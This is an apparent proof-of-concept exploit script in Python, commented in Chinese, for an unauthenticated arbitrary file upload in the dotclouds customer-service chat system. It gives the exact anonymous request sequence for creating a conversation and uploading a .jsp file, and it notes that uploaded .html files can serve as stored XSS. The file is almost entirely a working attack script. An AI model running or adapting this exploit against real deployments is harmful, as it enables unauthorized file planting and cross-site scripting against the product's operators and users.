#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""点云客服 net.dotclouds 未授权 multipart 任意文件上传 PoC。

前置（全部匿名，无 token / 无 Cookie）：
  1) POST /dotclouds/chat/conversation/createConv
     body {"companyId":"200005","configId":"200005","fingerprint":"<32位hex>",
           "source":"pc","referer":"直接访问","systemInfo":"Windows10",
           "browserInfo":"Chrome","random":"<同fingerprint>","preGuideQuestion":"",
           "username":"","position":""}
     → 200 {"code":"SUCCESS","data":{"convId":"<uuid32>","customer":{"uid":"<客服uid>"}}}
     ！fingerprint 必须是 32 位 hex（Fingerprint2 风格），带横线的 UUID 会被判 code=FIAL 参数异常
     ！companyId=200005 才有客服可分配；其他值可能返回 code=204 没有分配到客服
  2) POST /dotclouds/chat/conversation/sendConvMessageFile
     Content-Type: multipart/form-data; boundary=----X
     form 字段（顺序）：configId, companyId, fromUser(=fingerprint), convId, toUser(=customer.uid),
       messageId(随机 hex), source=visitor, convType=-2, fileName(=文件名，**必须作为文本字段提交，
       否则返回「不能上传空文件或者文件名不能为空」**), file(文件部件, filename=同 fileName)
     → 200 {"state":true,"code":"SUCCESS",
            "data":"<video ...><source src=\"/data/tmp/<日期>/<companyId>/customer/<uuid>.<原始扩展名>\" ...>"}

服务端对内容与扩展名零校验，原始扩展名保留，落地文件公开可读：
  GET https://<host>/data/tmp/<日期>/<companyId>/customer/<uuid>.<ext>

注意（实测结论）：/data/ 由 nginx 直接作为静态目录 alias 服务，
  .jsp 返回 Content-Type: application/octet-stream + 源码、.php 同理，均不被解析 →
  该上传点**不能直接 getshell**，仅在目标 nginx 把 /data/ 下脚本转发给应用容器时才等价于 webshell。
  .html 会以 text/html 返回（同域存储型 XSS 素材）。
"""
import json, sys, os, uuid
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import rawreq  # 裸 socket 客户端，精确控制 SNI/Host

HOST = 'www.example.com'   # 目标域名（SNI）
IP = '203.0.113.3'             # 目标 IP
PORT = 51010
BOUNDARY = '----RWBoundary7MA4YWxkTrZu0gW'
COMPANY = '200005'


def call(path, body, ctype='application/json;charset=UTF-8'):
    data = rawreq.send(IP, PORT, path, 'POST', {'Content-Type': ctype},
                       json.dumps(body).encode() if isinstance(body, dict) else body,
                       sni=HOST, host_hdr=HOST, timeout=20.0, maxlen=200000)
    txt = data.decode('utf-8', 'ignore')
    i = txt.find('{')
    return json.loads(txt[i:txt.rfind('}') + 1]) if i >= 0 else None


def multipart(fields, filename, content, ctype='image/png'):
    out = []
    for k, v in fields.items():
        out += ['--%s' % BOUNDARY, 'Content-Disposition: form-data; name="%s"' % k, '', str(v)]
    out += ['--%s' % BOUNDARY,
            'Content-Disposition: form-data; name="file"; filename="%s"' % filename,
            'Content-Type: %s' % ctype, '']
    return ('\r\n'.join(out) + '\r\n').encode() + content + ('\r\n--%s--\r\n' % BOUNDARY).encode()


fp = uuid.uuid4().hex
j = call('/dotclouds/chat/conversation/createConv', {
    'companyId': COMPANY, 'configId': COMPANY, 'fingerprint': fp, 'source': 'pc',
    'referer': '直接访问', 'customerUid': '', 'systemInfo': 'Windows10', 'browserInfo': 'Chrome',
    'random': fp, 'preGuideQuestion': '', 'username': '', 'position': ''})
assert j and j.get('code') == 'SUCCESS', j
conv = j['data']['convId']
cust = (j['data'].get('customer') or {}).get('uid')
print('convId=%s toUser=%s' % (conv, cust))

fields = {'configId': COMPANY, 'companyId': COMPANY, 'fromUser': fp, 'convId': conv,
          'toUser': cust, 'messageId': uuid.uuid4().hex, 'source': 'visitor',
          'convType': '-2', 'fileName': 'poc.jsp'}
body = multipart(fields, 'poc.jsp', b'<% out.print("POC"); %>', 'image/png')
j2 = call('/dotclouds/chat/conversation/sendConvMessageFile', body,
          'multipart/form-data; boundary=%s' % BOUNDARY)
print(json.dumps(j2, ensure_ascii=False))
